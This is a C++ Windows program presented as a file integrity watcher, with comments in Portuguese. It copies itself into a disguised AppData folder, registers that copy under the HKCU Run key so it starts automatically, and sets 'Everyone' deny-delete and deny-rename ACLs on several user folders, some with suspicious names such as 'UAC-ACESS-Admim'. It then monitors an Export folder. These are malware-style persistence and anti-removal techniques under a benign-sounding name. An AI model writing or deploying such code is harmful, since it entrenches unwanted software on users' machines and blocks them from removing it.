//x86_64-w64-mingw32-g++ monitor.cpp -o UserModeFileIntegrityWatcher.exe -std=c++17
#include <windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <aclapi.h>
#include <future>
#include <fstream>

namespace fs = std::filesystem;

/*
void deny_delete(const std::wstring& path) {
    PACL oldDACL = nullptr, newDACL = nullptr;
    PSECURITY_DESCRIPTOR sd = nullptr;

    EXPLICIT_ACCESSW ea[2]{};

    // Nega DELETE
    ea[0].grfAccessPermissions = DELETE;
    ea[0].grfAccessMode = DENY_ACCESS;
    ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea[0].Trustee.ptstrName = (LPWSTR)L"Everyone";

    // Nega DELETE_CHILD (apagar arquivos dentro da pasta)
    ea[1].grfAccessPermissions = FILE_DELETE_CHILD;
    ea[1].grfAccessMode = DENY_ACCESS;
    ea[1].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea[1].Trustee.ptstrName = (LPWSTR)L"Everyone";

    if (GetNamedSecurityInfoW(
            path.c_str(),
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            nullptr, nullptr,
            &oldDACL,
            nullptr,
            &sd
        ) == ERROR_SUCCESS) {

        if (SetEntriesInAclW(2, ea, oldDACL, &newDACL) == ERROR_SUCCESS) {

            // Protege a DACL contra herança
            SetNamedSecurityInfoW(
                (LPWSTR)path.c_str(),
                SE_FILE_OBJECT,
                DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                nullptr, nullptr,
                newDACL,
                nullptr
            );
        }
    }

    if (newDACL) LocalFree(newDACL);
    if (sd) LocalFree(sd);
}
*/
void corrigirWorkingDirectory() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    std::string path(exePath);

    // Remove o nome do executável → deixa só a pasta
    size_t pos = path.find_last_of("\\/");
    if (pos != std::string::npos) {
        path = path.substr(0, pos);
    }

    // Define o diretório de trabalho corretamente
    SetCurrentDirectoryA(path.c_str());
}
void autorun_pass_copy(){
    fs::path STATUS_LOG = "STATUS_REG.txt";
    wchar_t path[MAX_PATH];
        
    const char* user = std::getenv("USERNAME");
    int len = MultiByteToWideChar(CP_UTF8, 0, user, -1, NULL, 0);
    std::wstring wuser(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, user, -1, &wuser[0], len);
    wuser.resize(wcslen(wuser.c_str())); // ajusta o tamanho real da string
    std::wstring newDirectory0 = std::wstring(L"C:\\Users\\") + wuser + L"\\AppData\\Roaming\\Microsoft\\SHuSecurity";
    std::wstring newDirectory = std::wstring(L"C:\\Users\\") + wuser + L"\\AppData\\Roaming\\Microsoft\\SHuSecurity\\ThrustDefencySecurity";
    std::wstring newFile = newDirectory + L"\\IntegrityWatcherUserSecurity.exe";
    
    DWORD err;
    if(!CreateDirectoryW(newDirectory0.c_str(), NULL)) {
        err = GetLastError();
        if(err != ERROR_ALREADY_EXISTS) {
            std::ofstream file(STATUS_LOG, std::ios::app);
            if(!file.is_open()){
                file << "Erro ao iniciar\n" << err << std::endl;
            }
            file.close();
            
            return;
        }
    }
    std::wcout << L"Folder ready: " << newDirectory0 << "\n";

    if(!CreateDirectoryW(newDirectory.c_str(), NULL)) {
        err = GetLastError();
        if(err != ERROR_ALREADY_EXISTS) {
            std::ofstream file(STATUS_LOG, std::ios::app);
            if(!file.is_open()){
                file << L"Folder not created: "  << err << "\n";
            }
            file.close();
            return;
        }
    }
    std::wcout << L"Folder ready: " << newDirectory << "\n";
    if(GetModuleFileNameW(NULL, path, MAX_PATH)){
        std::wcout << "NameFile:" << path << " has been capturede \n";
    }else{
        std::wcout << "Erro to capture getNameFile\n";
        return;
    }
    if(CopyFileW(path,newFile.c_str(), FALSE)){
        std::wcout << "NameFile:" << path << " has been copied \n";
    }else{
        std::wcout << "NameFile:" << path << " has not been copied \n";
    }

    //ADD TO REGIST FOR WINDOWS
    HKEY hKey;
    LPCWSTR subKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::wstring valueNameStr = L"UserModeFileIntegrityWatcher(" + wuser + L")";
    LPCWSTR data = newFile.c_str();

    // Cria ou abre a chave de registro
    if (RegCreateKeyExW(HKEY_CURRENT_USER, subKey, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        // Define um valor string
        if (RegSetValueExW(hKey, valueNameStr.c_str(), 0, REG_SZ,
                           reinterpret_cast<const BYTE*>(data),
                           (lstrlenW(data) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            std::wcout << L"Chave e valor adicionados com sucesso.\n";
        } else {
            std::wcout << L"Erro ao definir o valor.\n";
        }

        RegCloseKey(hKey); // Fecha a chave
    } else {
        std::wcout << L"Erro ao criar/abrir a chave.\n";
    }

}

void deny_delete_and_rename(const std::wstring& path) {
    PACL oldDACL = nullptr, newDACL = nullptr;
    PSECURITY_DESCRIPTOR sd = nullptr;

    EXPLICIT_ACCESSW ea[3]{};

    // 1. Nega DELETE no arquivo/pasta (impede deletar ou renomear)
    ea[0].grfAccessPermissions = DELETE;
    ea[0].grfAccessMode = DENY_ACCESS;
    ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea[0].Trustee.ptstrName = (LPWSTR)L"Everyone";

    // 2. Nega FILE_DELETE_CHILD (impede apagar arquivos dentro da pasta)
    ea[1].grfAccessPermissions = FILE_DELETE_CHILD;
    ea[1].grfAccessMode = DENY_ACCESS;
    ea[1].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea[1].Trustee.ptstrName = (LPWSTR)L"Everyone";

    // 3. Nega DELETE também em todos os objetos dentro da pasta (impede renomear arquivos)
    ea[2].grfAccessPermissions = DELETE;
    ea[2].grfAccessMode = DENY_ACCESS;
    ea[2].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea[2].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea[2].Trustee.ptstrName = (LPWSTR)L"Everyone";

    // Pega a DACL atual
    if (GetNamedSecurityInfoW(path.c_str(),SE_FILE_OBJECT,DACL_SECURITY_INFORMATION,nullptr, nullptr,&oldDACL,nullptr,&sd) == ERROR_SUCCESS) {
        // Cria a nova DACL com as regras de negação
        if (SetEntriesInAclW(3, ea, oldDACL, &newDACL) == ERROR_SUCCESS) {

            // Aplica a nova DACL e protege contra herança
            SetNamedSecurityInfoW(
                (LPWSTR)path.c_str(),
                SE_FILE_OBJECT,
                DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                nullptr, nullptr,
                newDACL,
                nullptr
            );
        }
    }

    if (newDACL) LocalFree(newDACL);
    if (sd) LocalFree(sd);
}

int main() {
    wchar_t username[MAX_PATH];
    if (GetEnvironmentVariableW(L"USERNAME", username, MAX_PATH) == 0) {
        std::wcerr << L"Erro ao obter o nome do usuário!" << std::endl;
        return 1;
    }
    corrigirWorkingDirectory();
    autorun_pass_copy();

    // Monta os caminhos:
    std::wstring ExportPath = std::wstring(L"C:\\Users\\") + username + L"\\Export";
    std::wstring RoamingPath = std::wstring(L"C:\\Users\\") + username + L"\\AppData\\Roaming\\libs";
    std::wstring RoamingUACPath = std::wstring(L"C:\\Users\\") + username + L"\\AppData\\Roaming\\UAC-ACESS-Admim";
    std::wstring AdobePath = std::wstring(L"C:\\Users\\") + username + L"\\AdobeTrace";
    std::wstring SecuritySoftwarePath = std::wstring(L"C:\\Users\\") + username + L"\\AppData\\Roaming\\Microsoft\\SHuSecurity";


    HANDLE hDir = CreateFileW(ExportPath.c_str(),FILE_LIST_DIRECTORY,FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,NULL,OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );

    if (hDir == INVALID_HANDLE_VALUE) {
        std::cerr << "Erro ao abrir pasta\n";
        return 1;
    }

    char buffer[4096];
    DWORD bytesReturned;

    std::wcout << L"[MONITORANDO] " << ExportPath << std::endl;
    //deny_delete(WATCH_DIR);

    std::future<void> Execute1 = std::async(std::launch::async, deny_delete_and_rename, ExportPath);
    std::future<void> Execute2 = std::async(std::launch::async, deny_delete_and_rename, RoamingPath);
    std::future<void> Execute3 = std::async(std::launch::async, deny_delete_and_rename, RoamingUACPath);
    std::future<void> Execute4 = std::async(std::launch::async, deny_delete_and_rename, AdobePath);
    std::future<void> Execute5 = std::async(std::launch::async, deny_delete_and_rename, SecuritySoftwarePath);

    
    while (true) {
        ReadDirectoryChangesW(
            hDir,
            buffer,
            sizeof(buffer),
            TRUE,
            FILE_NOTIFY_CHANGE_FILE_NAME |
            FILE_NOTIFY_CHANGE_SIZE |
            FILE_NOTIFY_CHANGE_LAST_WRITE,
            &bytesReturned,
            NULL,
            NULL
        );

        FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buffer;

        do {
            std::wstring name(fni->FileName,
                              fni->FileNameLength / sizeof(WCHAR));

            fs::path full = ExportPath + L"\\" + name;

            switch (fni->Action) {
                case FILE_ACTION_ADDED:
                    std::wcout << L"[CREATED] " << name << std::endl;
                    break;

                case FILE_ACTION_MODIFIED:
                    std::wcout << L"[MODIFIED] " << name << std::endl;
                    break;
                case FILE_ACTION_RENAMED_OLD_NAME:
                    std::wcout << L"[RENAMED FROM] " << name << std::endl;
                    break;

                case FILE_ACTION_RENAMED_NEW_NAME:
                    std::wcout << L"[RENAMED TO] " << name << std::endl;
                    break;
            }

            if (!fni->NextEntryOffset) break;
            fni = (FILE_NOTIFY_INFORMATION*)((char*)fni + fni->NextEntryOffset);

        } while (true);
    }

    CloseHandle(hDir);
    return 0;
}


